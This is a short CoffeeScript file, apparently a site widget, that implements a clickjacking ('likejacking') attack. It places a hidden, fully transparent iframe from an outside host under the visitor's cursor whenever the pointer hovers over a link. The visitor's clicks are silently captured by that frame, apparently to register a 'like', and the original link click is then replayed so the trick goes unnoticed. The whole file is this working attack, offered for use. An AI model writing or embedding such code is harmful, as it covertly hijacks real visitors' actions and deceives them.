class @VisitorsController

  host: 'http://converzilla.kerweb.ru'
  element: null
  #host: 'http://localhost:3000'

  constructor: (clientId)->
    @clientId = clientId

    eventMethod = (if window.addEventListener then "addEventListener" else "attachEvent")
    eventer = window[eventMethod]
    messageEvent = (if eventMethod is "attachEvent" then "onmessage" else "message")

    eventer(messageEvent, (e) =>
      $('#wrap1').remove() if  e.data == 'like'
      if @element
        @element.trigger('click')
    , false);

    $('body').append "
    	<div id='wrap1' style='overflow: hidden;width: 50px;height: 30px;opacity: 0;position: absolute;z-index: 999999;'>
    		<div id='wrap2' style='margin-top: -5px;margin-left: -5px;'>
    			<iframe src='#{@host}/catching?id=#{@clientId}'></iframe>
    	</div>
    "
    $(window).on 'mousemove', (e) =>
      @element = $(event.target)
      if @element.is("a")
        $('#wrap1').css {left:  e.pageX - 20, top:   e.pageY - 12 }


